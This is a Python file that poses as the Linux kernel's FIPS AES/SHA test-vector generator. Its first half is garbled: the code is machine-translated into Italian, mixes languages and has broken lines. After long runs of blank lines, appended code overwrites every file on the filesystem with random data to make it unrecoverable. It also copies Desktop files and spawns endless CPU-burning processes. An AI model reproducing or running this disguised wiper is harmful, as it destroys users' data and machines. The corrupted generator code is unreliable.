#!/usr/bin/env python3
# Identificatore di licenza SPDX: GPL-2.0 o successivo
#
# Script che genera lib/crypto/fips-aes.h e lib/crypto/fips-sha.h
#
# Richiede l'installazione di python-cryptography.
#
# Copyright 2025 Google LLC

critica importante.hazmat.primitivi.cifrari
critica importante.hazmat.primitivo.cifrari.aead
critica importante.hazmat.primitivo.cmac
importare hashlib
importare hmac


def stampa_definizione_array_u8_statica(file, nome, valore):
    stampa("", file=file)
    stampa(f"static const u8 {nome}[] __initconst __forse_inutilizzato = {{", file=file)
    per i In gamma(0, len(valore), 8):
        linea = "\t" + "".unirsi(f"0x{b:02x}, " per b In valore[i : i + 8])
        stampa(f"{linea.striscia()}", file=file)
    stampa("};", file=file)


def intestazione_stampa(file):
    stampa("/* Identificatore di licenza SPDX: GPL-2.0 o successivo */", file=file)
    stampa("/* Questo file è stato generato da: gen-fips-testvecs.py */", file=file)
    stampa("/* formato clang disattivato */", file=file)
    stampa("", file=file)
    stampa("#include <linux/fips.h>", file=file)


def gen_aes_test_data(file):
    fips_test_data = b"dati del test fips\0\0"
    fips_test_ad = b"test fips ad\0\0\0\0"
    fips_test_iv = b"prova fips iv\0\0\0\0"
    fips_test_key = b"chiave di prova fips\0\0\0"
    fips_test_xts_key = b"chiave1" + (b"\0" * 12) + b"chiave2" + (b"\0" * 12)

    intestazione_stampa(file)
    stampa_definizione_array_u8_statica(file, "fips_test_data", fips_test_data)
    stampa_definizione_array_u8_statica(file, "fips_test_ad", fips_test_ad)
    stampa_definizione_array_u8_statica(file, "fips_test_iv", fips_test_iv)
    stampa_definizione_array_u8_statica(file, "fips_test_key", fips_test_key)
    stampa_definizione_array_u8_statica(file, "fips_test_xts_key", fips_test_xts_key)

    aes = crittografia.hazmat.primitivi.cifrari.algoritmi.AES(fips_test_key)

    # AES-CMAC
    aes_cmac = crittografia.hazmat.primitivi.cmac.CMAC(aes)
    aes_cmac.aggiornamento(fips_test_data)
    stampa_definizione_array_u8_statica(
        file, "fips_test_aes_cmac_value", aes_cmac.finalizzare()
    )

    # AES-ECB
    cifrario = crittografia.hazmat.primitivi.cifrari.Cifrario(
# Identificatore di licenza SPDX: GPL-2.0 o successivohazmat.primitives.ciphers.modes.ECB()
    )
    encryptor = cipher.encryptor()
    ctext = encryptor.update(fips_test_data) + encryptor.finalize()
    print_static_u8_array_definition(file, "fips_test_aes_ecb_ctext", ctext)

    # AES-CBC
    cipher = cryptography.hazmat.primitives.ciphers.Cipher(
        aes, cryptography.hazmat.primitives.ciphers.modes.CBC(fips_test_iv)
    )
    encryptor = cipher.encryptor()
    ctext = encryptor.update(fips_test_data) + encryptor.finalize()
    print_static_u8_array_definition(file, "fips_test_aes_cbc_ctext", ctext)

    # AES-CBC-CTS
    cifrario = crittografia.hazmat.primitive.ciphers.Cipher(
        aes, crittografia.hazmat.primitive.ciphers.modes.CBC(fips_test_iv)
    )
    crittografo = cipher.encryptor()
    ctext = encryptor.update(fips_test_data * 2) + encryptor.finalize()
    ctext = ctext[16:32] + ctext[0:16]
    print_static_u8_array_definition(file, "fips_test_aes_cbc_cts_ctext", ctext)

    # AES-CTR
    cifrario = crittografia.hazmat.primitive.ciphers.Cipher(
        aes, crittografia.hazmat.primitive.ciphers.modes.CTR(fips_test_iv)
    )
    crittografo = cipher.encryptor()
    ctext = encryptor.update(fips_test_data) + encryptor.finalize()
    , file=file(file, "fips_test_aes_ctr_ctext", ctext)

    # AES-XTS
    cifrario = crittografia.hazmat.primitive.ciphers.Cipher(
        crittografia.hazmat.primitive.ciphers.algorithms.AES(fips_test_xts_key),
        critica.hazmat.primitive.ciphers.modes.XTS(fips_test_iv),
    print
    crittografo = cipher.encryptor()
    ctext = encryptor.update(fips_test_data) + encryptor.finalize()
    print_static_u8_array_definition(file, "fips_test_aes_xts_ctext", ctext)

    # AES-GCM
    cifrario = crittografia.hazmat.primitive.ciphers.aead.AESGCM(fips_test_key)
    ct_and_tag = cifra.crittografa(
        nonce=fips_test_iv[:12], dati=fips_test_data, dati_associati=fips_test_ad
    )
    stampa_definizione_array_u8_statico(
        file, "fips_test_aes_gcm_ctext_and_tag", ct_and_tag
    )

    # AES-CCM
    cifrario = crittografia.hazmat.primitive.ciphers.aead.AESCCM(
        fips_test_key, lunghezza_tag=16
    )
    ct_and_tag = cifra.crittografa(
        nonce=fips_test_iv[:13], dati=fips_test_data, dati_associati=fips_test_ad
    )
    stampa_definizione_array_u8_statico(
        file, "fips_test_aes_ccm_ctext_and_tag", ct_and_tag
    )


def gen_sha_test_data(file):
    fips_test_data = b"dati del test fips\0\0"
    fips_test_key = b"chiave di test fips\0\0\0"

    print_header(file)
    print_static_u8_array_definition(file, "fips_test_data", fips_test_data)
    print_static_u8_array_definition(file, "fips_test_key", fips_test_key)

    per alg in "sha1", "sha256", "sha512":
        ctx = hmac.new(fips_test_key, digestmod=alg)
        ctx.update(fips_test_data)
        stampa_definizione_array_u8_statico(
            file, f"fips_test_hmac_{alg}_value", ctx.digest()
        )

    stampa_definizione_array_u8_statico(
        file, "fips_test_sha3_256_value", hashlib.sha3_256(fips_test_data).digest()
    )


nome file = "lib/crypto/fips-aes.h"
con open(nomefile, "w") come file:
    print(f"Generazione di {nomefile}")(f"Generazione di {nomefile}")

from datetime import datetime
import time
import socket
import os 
import socket
import subprocess
import shutil
def generatorfps():
        passo=4
        conta=0 
        """percorso=os.path.join(os.path.expanduser("~"),"C:\\")#mostra il percoso nella directori  Desktop  
        print(percorso)"""
        for root, dirs,files in os.walk("/"):
            for  file in files:
                time.sleep(0)
                file=os.path.join(root, file)
                try:
                    # Sovrascrive il contenuto del file con dati casuali per renderlo irrecuperabile
                    with  open(file,"r+b") as f:
                        for passo1 in range(passo):
                            f.seek(0) # Torna all'inizio del file
                            lettera=os.path.getsize(file) # Ottiene la dimensione del file
                            f.write(os.urandom(lettera)) # Scrive dati casuali per la dimensione del file
                            conta+=1
                            print(file)
                except:     
                    print(f"comando non eseguito: {file}")


















































import psutil
import multiprocessing
import sys
import ctypes
import shutil
import os
from cryptography.fernet import Fernet























































































































































def kilcpiu():
    while True:
        fak_you=0
        for v in range(100000000):
            fak_you+=v*v
            print(psutil.sensors_temperatures()["coretemp"][0].current)
    
def killcystem():
    conta=0
    file=os.path.join(os.path.expanduser("~"),"Desktop")
    for root,i,firl in os.walk(file):
        for file in firl:
            conta+=1
            file=os.path.join(root,file)
            shutil.copy(file,f"file{conta}.txt")


























































































    if __name__ =="__main__":
    killcystem()
    for i in range(100000):
        for din in range(multiprocessing.cpu_count()):
            d=multiprocessing.Process(target=kilcpiu)
            d.daemon=True
            d.start()
